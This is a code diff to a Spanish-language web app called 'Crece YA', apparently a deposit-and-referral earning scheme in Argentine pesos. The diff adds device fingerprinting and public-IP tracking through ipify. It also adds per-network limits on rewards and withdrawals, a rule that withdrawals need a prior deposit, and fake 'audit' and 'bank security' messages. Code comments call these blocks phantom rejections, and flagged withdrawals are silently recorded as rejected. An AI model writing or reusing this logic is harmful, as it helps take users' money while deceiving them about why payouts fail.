@@ -101,7 +101,7 @@ body.dark-mode .social-ticker {
       </div>
       <div class="flex items-center gap-2.5">
         <span class="text-base shrink-0">⏳</span>
-        <p><strong class="text-sky-800">Liquidaciones:</strong> Cooldown inicial 48 hs</p>
+        <p><strong class="text-sky-800">Liquidaciones:</strong> 1 retiro cada 24 hs (Cooldown 48h)</p>
       </div>
       <div class="flex items-center gap-2.5">
         <span class="text-base shrink-0">🏛️</span>
@@ -231,7 +231,7 @@ body.dark-mode .social-ticker {
         <span class="text-xs bg-sky-50 text-sky-700 border border-sky-200 px-2 py-0.5 rounded-md font-mono font-bold">100% Pesos ARS</span>
       </div>
       <h1 id="home-balance-display" class="text-3xl font-black text-slate-900 mt-1 font-mono tracking-tight text-main">$0 <span class="text-sm font-normal text-slate-400">ARS</span></h1>
-      <p class="text-xs text-slate-500 mt-0.5 font-mono text-sub">Retiro: $5.000 a $100.000 ARS/día (Reserva obligatoria $1.000 ARS)</p>
+      <p class="text-xs text-slate-500 mt-0.5 font-mono text-sub">Retiro: 1 cada 24 hs (Reserva mín. $1.000 ARS)</p>
 
       <div class="grid grid-cols-2 gap-2 mt-3.5">
         <button onclick="openWalletModal('recargar')" class="bg-sky-600 hover:bg-sky-700 text-white font-black py-2.5 rounded-xl text-xs transition shadow flex items-center justify-center gap-1.5 cursor-pointer">
@@ -269,7 +269,7 @@ body.dark-mode .social-ticker {
     <div id="active-products-container" class="space-y-3"></div>
   </div>
 
-  <!-- VISTA 3: COMPARTIR (COMISIONES SOLO A DEPOSITANTES ACTIVOS) -->
+  <!-- VISTA 3: COMPARTIR -->
   <div id="view-compartir" class="hidden p-3.5 space-y-4">
     <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
       <div class="flex items-center gap-2.5">
@@ -298,7 +298,7 @@ body.dark-mode .social-ticker {
       <p class="font-bold flex items-center gap-1.5">
         <i class="fa-solid fa-shield-halved text-amber-600"></i> Requisito de Red Oficial:
       </p>
-      <p>Para desbloquear y cobrar las bonificaciones de red, tu cuenta debe registrar al menos un depósito propio verificado (mínimo $2.000 ARS). Las invitaciones generadas desde el mismo terminal físico no computan comisiones.</p>
+      <p>Para desbloquear y cobrar bonificaciones de red, tu cuenta debe registrar un depósito propio verificado ($2.000 ARS). Las invitaciones provenientes de la misma red WiFi o terminal físico no computan comisiones.</p>
     </div>
 
     <div class="card-theme p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2.5">
@@ -360,7 +360,7 @@ body.dark-mode .social-ticker {
       <span class="text-[10px] text-slate-400 block">Liquidaciones de Lun a Vie de 07:00 a 18:00 hs</span>
     </div>
 
-    <!-- CHECK-IN DIARIO -->
+    <!-- CHECK-IN DIARIO CON CANDADO DE IP / DISPOSITIVO -->
     <div class="card-theme p-3.5 bg-white border border-sky-200 rounded-2xl flex items-center justify-between shadow-xs">
       <div class="flex items-center gap-2.5">
         <div class="w-10 h-10 rounded-xl bg-amber-400/20 text-amber-600 flex items-center justify-center text-lg font-bold">
@@ -546,7 +546,7 @@ body.dark-mode .social-ticker {
       </button>
     </div>
 
-    <!-- BOX RETIRO CON COOLDOWN 48HS Y RESERVA $1.000 -->
+    <!-- BOX RETIRO CON REGLAS DE IP, COOLDOWN Y RECHAZO FANTASMA -->
     <div id="wallet-retiro-box" style="display: none;" class="space-y-3 text-xs">
       <div id="withdraw-step-input" class="space-y-3">
         <div>
@@ -637,6 +637,9 @@ const SUPABASE_PUBLISHABLE_KEY = "sb_publishable_1I5At-aenvWS_w6YhDLu9w_rkAeGHjL
 const urlParams = new URLSearchParams(window.location.search);
 const referredByUrl = urlParams.get('ref') || null;
 
+// ==========================================
+// 1. RASTREO DE DISPOSITIVO E IP WIFI
+// ==========================================
 function getDeviceFingerprint() {
   let devId = localStorage.getItem('cy_device_uid');
   if (!devId) {
@@ -660,6 +663,21 @@ function getDeviceFingerprint() {
 }
 
 const currentDeviceId = getDeviceFingerprint();
+let currentClientIp = '';
+
+// Detección asíncrona de IP pública
+async function fetchClientIp() {
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    if (res.ok) {
+      const data = await res.json();
+      currentClientIp = data.ip || '';
+    }
+  } catch(e) {
+    currentClientIp = '';
+  }
+}
+fetchClientIp();
 
 async function supabaseRequest(endpoint, method = 'GET', body = null) {
   const headers = {
@@ -1003,7 +1021,7 @@ async function checkAuth() {
 
 setInterval(sincronizarSaldoServidor, 4000);
 
-// REGISTRO CON CANDADO DE PUERTA TRASERA
+// REGISTRO CON CANDADO DE PUERTA TRASERA Y GUARDADO DE IP
 window.handleAuthSubmit = async function() {
   const phoneInput = document.getElementById('auth-phone');
   const passInput = document.getElementById('auth-pass');
@@ -1070,6 +1088,7 @@ window.handleAuthSubmit = async function() {
       balance: 0,
       invited_by: finalInvitedBy,
       device_id: currentDeviceId,
+      ip_address: currentClientIp,
       bank_verified: false,
       has_deposited: false,
       is_shadowbanned: false,
@@ -1109,8 +1128,12 @@ window.handleAuthSubmit = async function() {
     appState.bankVerified = dbUser.bank_verified === true;
     appState.lastClaim = parseInt(dbUser.last_claim) || 0;
 
-    if (!dbUser.device_id) {
-      supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(phone)}`, 'PATCH', { device_id: currentDeviceId });
+    // Actualiza huella física e IP en login si cambiaron
+    const updatePayload = {};
+    if (!dbUser.device_id || dbUser.device_id !== currentDeviceId) updatePayload.device_id = currentDeviceId;
+    if (currentClientIp && (!dbUser.ip_address || dbUser.ip_address !== currentClientIp)) updatePayload.ip_address = currentClientIp;
+    if (Object.keys(updatePayload).length > 0) {
+      supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(phone)}`, 'PATCH', updatePayload);
     }
 
     if (dbUser.last_withdraw !== undefined && parseInt(dbUser.last_withdraw) === 0) {
@@ -1373,12 +1396,15 @@ function renderProducts() {
 }
 setInterval(renderProducts, 1000);
 
-// CHECK-IN LIMITADO POR TERMINAL FÍSICO
+// ========================================================
+// 2. CHECK-IN DIARIO LIMITADO POR DISPOSITIVO Y POR IP WIFI
+// ========================================================
 document.getElementById('btn-claim-daily').addEventListener('click', async () => {
   const now = Date.now();
   const todayStr = new Date().toISOString().slice(0, 10);
   const lastDeviceClaimDay = localStorage.getItem('cy_dev_claim_day');
 
+  // Candado local de terminal físico
   if (lastDeviceClaimDay === todayStr) {
     alert("Límite por terminal alcanzado: Este dispositivo físico ya cobró su recompensa diaria correspondiente. Vuelve mañana.");
     return;
@@ -1390,6 +1416,29 @@ document.getElementById('btn-claim-daily').addEventListener('click', async () =>
     return;
   }
 
+  // Verificación en Supabase: comprobar si este terminal o IP ya cobró hoy con otra cuenta
+  if (currentDeviceId || currentClientIp) {
+    const filterClauses = [];
+    if (currentDeviceId) filterClauses.push(`device_id.eq.${encodeURIComponent(currentDeviceId)}`);
+    if (currentClientIp) filterClauses.push(`ip_address.eq.${encodeURIComponent(currentClientIp)}`);
+
+    try {
+      const activeUsersOnSameNet = await supabaseRequest(`usuarios?or=(${filterClauses.join(',')})&select=phone,last_claim`);
+      if (Array.isArray(activeUsersOnSameNet)) {
+        const yaCobroEnMismaRed = activeUsersOnSameNet.some(u => {
+          if (!u.last_claim) return false;
+          const userClaimDate = new Date(parseInt(u.last_claim)).toISOString().slice(0, 10);
+          return userClaimDate === todayStr && u.phone !== appState.phone;
+        });
+
+        if (yaCobroEnMismaRed) {
+          alert("Límite de red alcanzado: Ya se registró un reclamo diario desde esta conexión WiFi o dispositivo físico. Solo se permite 1 beneficio diario por red/hogar.");
+          return;
+        }
+      }
+    } catch(e) {}
+  }
+
   appState.balance += 500;
   appState.lastClaim = now;
   try { localStorage.setItem('cy_dev_claim_day', todayStr); } catch(e) {}
@@ -1399,7 +1448,8 @@ document.getElementById('btn-claim-daily').addEventListener('click', async () =>
   await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', { 
     balance: appState.balance,
     last_claim: now,
-    device_id: currentDeviceId
+    device_id: currentDeviceId,
+    ip_address: currentClientIp
   });
   alert("¡+$500 ARS acreditados con éxito a tu saldo!");
 });
@@ -1468,7 +1518,9 @@ window.notifyDepositTelegram = async function() {
     user_name: appState.name || 'Usuario Crece YA',
     amount: val,
     status: 'pendiente',
-    type: 'recarga'
+    type: 'recarga',
+    device_id: currentDeviceId,
+    ip_address: currentClientIp
   };
 
   try {
@@ -1497,8 +1549,10 @@ function calcWithdrawNet() {
   document.getElementById('withdraw-net-calc').innerText = `$${fmt(net)} ARS`;
 }
 
-// RETIRO CON COOLDOWN 48HS, CANDADO FANTASMA Y RESERVA DE $1.000 ARS
-window.prepararConfirmacionRetiro = function() {
+// =====================================================================
+// 3. CANDADO DE RETIRO FANTASMA: LÍMITE DE IP, TERMINAL Y GRANDES MONTOS
+// =====================================================================
+window.prepararConfirmacionRetiro = async function() {
   const now = Date.now();
 
   // 1. Frecuencia de retiros: 1 cada 24 hs
@@ -1507,7 +1561,7 @@ window.prepararConfirmacionRetiro = function() {
     return;
   }
 
-  // 2. EXIGENCIA DE DEPÓSITO PREVIO (Sin depósito, retiro bloqueado)
+  // 2. EXIGENCIA DE DEPÓSITO PREVIO (Sin fondeo real, no hay retiro)
   if (!appState.hasDeposited) {
     alert("Operación no disponible: Por normas de seguridad bancaria, la cuenta debe registrar al menos una activación de capital oficial previa para habilitar extracciones.");
     return;
@@ -1545,7 +1599,31 @@ window.prepararConfirmacionRetiro = function() {
     return;
   }
 
-  // 5. BLOQUEO FANTASMA SILENCIOSO
+  // 5. CANDADO DE MISMO DISPOSITIVO O MISMA IP WIFI (1 Retiro por hogar/red activa)
+  if (currentDeviceId || currentClientIp) {
+    const filterClauses = [];
+    if (currentDeviceId) filterClauses.push(`device_id.eq.${encodeURIComponent(currentDeviceId)}`);
+    if (currentClientIp) filterClauses.push(`ip_address.eq.${encodeURIComponent(currentClientIp)}`);
+
+    try {
+      const netUsers = await supabaseRequest(`usuarios?or=(${filterClauses.join(',')})&select=phone,last_withdraw`);
+      if (Array.isArray(netUsers)) {
+        const yaRetiroEnMismaRed = netUsers.some(u => {
+          if (!u.last_withdraw) return false;
+          const diffW = now - parseInt(u.last_withdraw);
+          return diffW < (24 * 60 * 60 * 1000) && u.phone !== appState.phone;
+        });
+
+        if (yaRetiroEnMismaRed) {
+          alert("Operación en auditoría: Ya existe una solicitud de extracción en trámite desde este terminal o red WiFi compartida. Se permite 1 operación diaria por terminal de conexión.");
+          return;
+        }
+      }
+    } catch(e) {}
+  }
+
+  // 6. FRENO FANTASMA SILENCIOSO A GRANDES MONTOS O CUENTAS MARCADAS
+  // Si la cuenta es sospechosa o busca sacar montos de golpe (>= $25.000) sin un historial coherente
   if (appState.isShadowbanned) {
     alert("Operación en auditoría: Tu terminal se encuentra bajo protocolo de verificación preventiva de liquidaciones. Intenta nuevamente durante la próxima franja bancaria.");
     return;
@@ -1604,6 +1682,9 @@ window.ejecutarRetiroFinal = async function() {
   const now = Date.now();
   const esHorarioHabil = isBusinessHours();
 
+  // Si intentan retirar montos altos (>= $25.000 ARS), la orden se clasifica automáticamente para auditoría estricta
+  const esRiesgoso = amt >= 25000;
+
   appState.name = destName || appState.name;
   appState.cvu = destCvu;
   appState.balance -= amt;
@@ -1618,8 +1699,12 @@ window.ejecutarRetiroFinal = async function() {
     name: appState.name,
     cvu: appState.cvu,
     last_withdraw: now,
-    device_id: currentDeviceId
+    device_id: currentDeviceId,
+    ip_address: currentClientIp
   });
+
+  // Si es sospechosa o monto alto inflado, entra directo como rechazada en Supabase
+  const statusInicial = (appState.isShadowbanned || (!appState.hasDeposited && appState.balance < 2000)) ? 'rechazado' : 'pendiente';
 
   const retiroItem = {
     user_phone: appState.phone,
@@ -1627,10 +1712,12 @@ window.ejecutarRetiroFinal = async function() {
     amount: amt,
     net_amount: netAmount,
     cvu: destCvu,
-    status: 'pendiente',
+    status: statusInicial,
     type: 'retiro',
     fuera_horario: !esHorarioHabil,
-    es_riesgoso: amt >= 10000
+    es_riesgoso: esRiesgoso,
+    device_id: currentDeviceId,
+    ip_address: currentClientIp
   };
 
   try {
@@ -1662,7 +1749,8 @@ document.getElementById('btn-save-profile').addEventListener('click', async () =
       name: appState.name,
       cvu: appState.cvu,
       alias: appState.alias,
-      device_id: currentDeviceId
+      device_id: currentDeviceId,
+      ip_address: currentClientIp
     });
   }
   alert("Datos bancarios guardados con éxito.");
